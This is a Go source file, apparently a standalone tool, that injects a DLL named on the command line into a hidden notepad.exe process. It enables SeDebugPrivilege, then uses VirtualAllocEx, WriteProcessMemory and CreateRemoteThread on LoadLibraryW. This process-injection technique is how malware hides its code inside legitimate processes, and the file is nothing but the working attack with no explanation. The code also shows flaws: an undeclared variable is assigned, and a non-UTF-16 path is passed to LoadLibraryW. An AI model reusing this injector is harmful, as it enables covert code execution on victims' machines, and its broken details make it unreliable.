import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"

	"github.com/JamesHovious/w32"
	"golang.org/x/sys/windows"
)

func main() {
	dllPath, _ := syscall.FullPath(os.Args[1])
	var token windows.Token
	var tp windows.Tokenprivileges
	var privName string = "SeDebugPrivilege"
	privStr, _ := syscall.UTF16PtrFromString(privName)
	hCurrentProc, _ := windows.GetCurrentProcess()
	windows.OpenProcessToken(hCurrentProc, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
	windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		log.Panic(err)
	}

	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Start()

	cmdPid := cmd.Process.Pid
	fmt.Println(cmdPid)

	hProc, err := w32.OpenProcess(w32.PROCESS_ALL_ACCESS, false, uint32(cmdPid))
	if err != nil {
		log.Panic(err)
	}

	dwMemSize := len(dllPath) + 1
	lpRemoteMem, err := w32.VirtualAllocEx(hProc, 0, dwMemSize, w32.MEM_RESERVE|w32.MEM_COMMIT, w32.PAGE_READWRITE)

	if err != nil {
		log.Panic(err)
	}

	err = w32.WriteProcessMemory(hProc, uint32(lpRemoteMem), []byte(dllPath), uint(dwMemSize))
	if err != nil {
		log.Panic(err)
	}

	moduleKernel, _ := syscall.LoadLibrary("kernel32.dll")
	lpLoadLibrary, err := syscall.GetProcAddress(moduleKernel, "LoadLibraryW")
	if err != nil {
		log.Panic(err)
	}

	hThread, _, err := w32.CreateRemoteThread(hProc, nil, 0, uint32(lpLoadLibrary), lpRemoteMem, 0)
	if err != nil {
		log.Panic(err)
	}

	w32.ResumeThread(hThread)
	w32.WaitForSingleObject(hThread, syscall.INFINITE)
	exitCode, err := w32.GetExitCodeProcess(hProc)
	if err != nil {
		log.Panic(err)
	} else {
		log.Println(exitCode)
	}
	w32.CloseHandle(hThread)
}